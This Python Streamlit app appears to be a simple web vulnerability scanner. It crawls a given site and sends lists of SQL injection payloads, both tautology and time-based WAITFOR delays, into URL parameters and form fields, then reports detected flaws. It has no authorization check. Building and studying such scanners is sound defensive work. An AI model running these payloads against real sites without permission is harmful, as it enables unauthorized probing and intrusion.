import base64
import streamlit as st
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import pandas as pd

class WebVulnerabilityScanner:
    def __init__(self, base_url, max_threads=10, max_depth=3):
        self.base_url = base_url
        self.max_threads = max_threads
        self.max_depth = max_depth
        self.visited_links = set()
        self.internal_links = set()
        self.vulnerabilities = []

    def crawl_and_scan(self):
        with st.spinner("Crawling and scanning the website..."):
            self.crawl(self.base_url, 0)
            self.scan_vulnerabilities()
        st.success("Scanning completed!")
        self.show_results()

    def crawl(self, url, depth):
        if url in self.visited_links or depth > self.max_depth:
            return

        st.write(f"Crawling: {url} (Depth: {depth})")
        self.visited_links.add(url)

        try:
            response = requests.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            self.extract_links(soup, url)
        except requests.RequestException as e:
            st.write(f"Error crawling {url}: {e}")
            return

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_tasks = [executor.submit(self.crawl, link, depth + 1) for link in list(self.internal_links - self.visited_links)]
            for future in as_completed(future_tasks):
                future.result()

    def extract_links(self, soup, base_url):
        for link in soup.find_all('a', href=True):
            href = urljoin(base_url, link['href'])
            parsed_href = urlparse(href)
            if parsed_href.netloc == urlparse(self.base_url).netloc and parsed_href.scheme in ['http', 'https']:
                self.internal_links.add(href)

    def extract_forms(self, soup, url):
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            if action:
                form_url = urljoin(url, action)
                inputs = form.find_all(['input', 'textarea'])
                data = {input.get('name'): 'test' for input in inputs if input.get('name')}
                yield form_url, data

    def detect_sql_injection(self, url):
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1",
            "' OR 1=1 --",
            "' OR 1=1 /*",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "') OR ('1'='1' /*",
            "'; WAITFOR DELAY '0:0:5' --",
            "'; WAITFOR DELAY '0:0:5' /*"
        ]
        error_messages = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "sql error",
            "sql syntax"
        ]
        significant_delay = 5  # Seconds

        try:
            for payload in payloads:
                inject_url = f"{url}?id={payload}"
                st.write(f"Testing URL: {inject_url}")
                start_time = time.time()
                response = requests.get(inject_url)
                response_time = time.time() - start_time

                if response.status_code == 200:
                    for error in error_messages:
                        if error.lower() in response.text.lower():
                            st.write(f"SQL Injection vulnerability found in {url} with payload: {payload}")
                            self.vulnerabilities.append({'url': url, 'payload': payload, 'type': 'Error-based SQLi'})
                            return

                if response_time > significant_delay:
                    st.write(f"Time-based SQL Injection vulnerability found in {url} with payload: {payload}")
                    self.vulnerabilities.append({'url': url, 'payload': payload, 'type': 'Time-based SQLi'})
                    return
        except requests.RequestException as e:
            st.write(f"Error detecting SQL Injection in {url}: {e}")

    def detect_sql_injection_in_forms(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')

            for form_url, data in self.extract_forms(soup, url):
                payloads = [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' /*",
                    "' OR 1=1",
                    "' OR 1=1 --",
                    "' OR 1=1 /*",
                    "') OR ('1'='1",
                    "') OR ('1'='1' --",
                    "') OR ('1'='1' /*",
                    "'; WAITFOR DELAY '0:0:5' --",
                    "'; WAITFOR DELAY '0:0:5' /*"
                ]
                error_messages = [
                    "you have an error in your sql syntax",
                    "warning: mysql",
                    "unclosed quotation mark",
                    "quoted string not properly terminated",
                    "sql error",
                    "sql syntax"
                ]
                significant_delay = 5  # Seconds

                for payload in payloads:
                    for key in data.keys():
                        data[key] = payload
                    st.write(f"Testing form URL: {form_url} with data: {data}")
                    start_time = time.time()
                    response = requests.post(form_url, data=data)
                    response_time = time.time() - start_time

                    if response.status_code == 200:
                        for error in error_messages:
                            if error.lower() in response.text.lower():
                                st.write(f"SQL Injection vulnerability found in form at {form_url} with payload: {payload}")
                                self.vulnerabilities.append({'url': form_url, 'payload': payload, 'type': 'Error-based SQLi'})
                                break

                    if response_time > significant_delay:
                        st.write(f"Time-based SQL Injection vulnerability found in form at {form_url} with payload: {payload}")
                        self.vulnerabilities.append({'url': form_url, 'payload': payload, 'type': 'Time-based SQLi'})
                        break
        except requests.RequestException as e:
            st.write(f"Error detecting SQL Injection in forms at {url}: {e}")

    def scan_vulnerabilities(self):
        with st.spinner("Scanning for SQL Injection vulnerabilities..."):
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                future_tasks = [executor.submit(self.detect_sql_injection, link) for link in self.visited_links]
                future_tasks += [executor.submit(self.detect_sql_injection_in_forms, link) for link in self.visited_links]
                for future in as_completed(future_tasks):
                    pass

    def show_results(self):
        if self.vulnerabilities:
            st.subheader("Vulnerable URLs found:")
            df = pd.DataFrame(self.vulnerabilities)
            st.dataframe(df)
            st.markdown(get_export_link(df), unsafe_allow_html=True)
        else:
            st.subheader("No SQL Injection vulnerabilities found.")

def get_export_link(df):
    csv = df.to_csv(index=False)
    b64 = base64.b64encode(csv.encode()).decode()
    href = f'<a href="data:file/csv;base64,{b64}" download="vulnerability_report.csv">Download CSV Report</a>'
    return href

def main():
    st.title("Web Vulnerability Scanner")
    st.write("Enter the URL of the website you want to scan for SQL Injection vulnerabilities.")

    base_url = st.text_input("Website URL", "http://testphp.vulnweb.com")

    if st.button("Scan"):
        if base_url:
            scanner = WebVulnerabilityScanner(base_url)
            scanner.crawl_and_scan()
        else:
            st.warning("Please enter a valid URL.")

if __name__ == "__main__":
    main()
